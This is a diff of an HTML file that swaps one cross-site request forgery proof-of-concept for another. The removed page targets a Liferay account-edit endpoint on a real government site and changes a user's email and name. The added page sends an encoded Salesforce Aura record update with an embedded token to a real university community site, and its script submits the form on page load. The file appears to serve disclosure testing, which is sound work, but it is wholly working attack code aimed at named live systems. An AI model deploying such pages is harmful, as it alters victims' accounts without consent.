@@ -1,24 +1,19 @@
+<!DOCTYPE html>
 <html>
-  <body>
-    <h2>CSRF PoC - Exploit</h2>
-    <form id="csrfForm" action="https://www.globe.gov/manage?p_p_id=com_liferay_my_account_web_portlet_MyAccountPortlet&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&_com_liferay_my_account_web_portlet_MyAccountPortlet_javax.portlet.action=%2Fusers_admin%2Fedit_user&p_p_auth=DeDOKppr" method="POST">
-      
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_formDate" value="1741939542640">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_p_u_i_d" value="148877258">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_cmd" value="update">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_emailAddress" value="victimvictim123456@gmail.com">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_firstName" value="victimaaaa">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_lastName" value="Scientist">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_birthdayMonth" value="0">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_birthdayDay" value="1">
-      <input type="hidden" name="_com_liferay_my_account_web_portlet_MyAccountPortlet_birthdayYear" value="1970">
-      <input type="hidden" name="p_auth" value="DeDOKppr">
-
-      <input type="submit" value="Exploit">
+<head>
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <form action="https://communities.gse.harvard.edu/ppe/s/sfsites/aura?r=49&aura.RecordUi.updateRecord=1" method="POST">
+        <input type="hidden" name="message" value='%7B%22actions%22%3A%5B%7B%22id%22%3A%22734%3Ba%22%2C%22descriptor%22%3A%22aura%3A%2F%2FRecordUiController%2FACTION%24updateRecord%22%2C%22callingDescriptor%22%3A%22UNKNOWN%22%2C%22params%22%3A%7B%22recordId%22%3A%22005UY000006759BYAQ%22%2C%22recordInput%22%3A%7B%22fields%22%3A%7B%22Id%22%3A%22005UY000006759BYAQ%22%2C%22PostalCode%22%3A%222335%22%7D%7D%7D%7D%5D%7D'>
+        <input type="hidden" name="aura.context" value='%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22c1ItM3NYNWFUOE5oQkUwZk1sYW1vQWg5TGxiTHU3MEQ5RnBMM0VzVXc1cmcxMS4zMjc2OC4z%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221233_RswVGF3YJuF30XUGfC3LUQ%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%22srcdoc%22%3Atrue%7D%2C%22uad%22%3Atrue%7D'>
+        <input type="hidden" name="aura.pageURI" value="%2Fppe%2Fs%2Fprofile%2F005UY000006759BYAQ">
+        <input type="hidden" name="aura.token" value="eyJub25jZSI6IlIxRk9pa2lFRUlld09BbVR1U056bHFaS0xqQ21LRnZycmZyQllueE1FX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFVZMDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHVVkwMDAwMDAwMDFkXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3NDM2MjA2NDkyNzcsImV4cCI6MH0%3D..SsUG5ftm_OfafZ2L3qe5z1tCnlko7vqunKJxqwDWehQ%3D">
+        <input type="submit" value="Submit CSRF Request">
     </form>
-
     <script>
-      document.getElementById("csrfForm").submit();
+        document.forms[0].submit(); // Auto-submit the form for exploitation
     </script>
-  </body>
+</body>
 </html>
